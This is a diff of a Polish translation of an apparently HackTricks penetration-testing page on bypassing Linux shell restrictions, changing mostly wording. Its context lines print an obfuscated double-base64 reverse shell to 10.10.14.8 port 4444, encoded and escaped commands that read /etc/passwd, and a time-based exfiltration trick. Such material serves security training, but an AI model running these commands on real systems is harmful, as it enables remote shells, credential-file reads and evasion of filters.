@@ -1,10 +1,10 @@
-# Ominięcie Ograniczeń Linuxa
+# Ominięcie ograniczeń Linuxa
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Ominięcia Powszechnych Ograniczeń
+## Ominięcia powszechnych ograniczeń
 
-### Odwrócony Shell
+### Odwrócony powłok
 ```bash
 # Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
@@ -111,7 +111,7 @@ uname!-1\-a # This equals to uname -a
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Ominić potoki
+### Ominić rury
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
@@ -130,7 +130,7 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-### Ekstrakcja danych oparta na czasie
+### Eksfiltracja danych oparta na czasie
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
@@ -145,7 +145,7 @@ Możesz użyć **burpcollab** lub [**pingb**](http://pingb.in) na przykład.
 
 ### Builtins
 
-W przypadku, gdy nie możesz wykonywać zewnętrznych funkcji i masz dostęp tylko do **ograniczonego zestawu builtins, aby uzyskać RCE**, istnieje kilka przydatnych sztuczek, aby to zrobić. Zwykle **nie będziesz mógł użyć wszystkich** **builtins**, więc powinieneś **znać wszystkie swoje opcje**, aby spróbować obejść więzienie. Pomysł od [**devploit**](https://twitter.com/devploit).\
+W przypadku, gdy nie możesz wykonywać zewnętrznych funkcji i masz dostęp tylko do **ograniczonego zestawu builtins do uzyskania RCE**, istnieje kilka przydatnych sztuczek, aby to zrobić. Zwykle **nie będziesz mógł użyć wszystkich** **builtins**, więc powinieneś **znać wszystkie swoje opcje**, aby spróbować obejść więzienie. Pomysł od [**devploit**](https://twitter.com/devploit).\
 Przede wszystkim sprawdź wszystkie [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Oto kilka **zalecenia**:
 ```bash
 # Get list of builtins
@@ -297,7 +297,7 @@ ln /f*
 ```
 ## Ominięcie Ochrony Tylko do Odczytu/Noexec/Distroless
 
-Jeśli znajdujesz się w systemie plików z **ochroną tylko do odczytu i noexec** lub nawet w kontenerze distroless, wciąż istnieją sposoby na **wykonanie dowolnych binarek, nawet powłoki!:**
+Jeśli znajdujesz się w systemie plików z **ochroną tylko do odczytu i noexec** lub nawet w kontenerze distroless, nadal istnieją sposoby na **wykonanie dowolnych binarek, nawet powłoki!:**
 
 {{#ref}}
 ../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
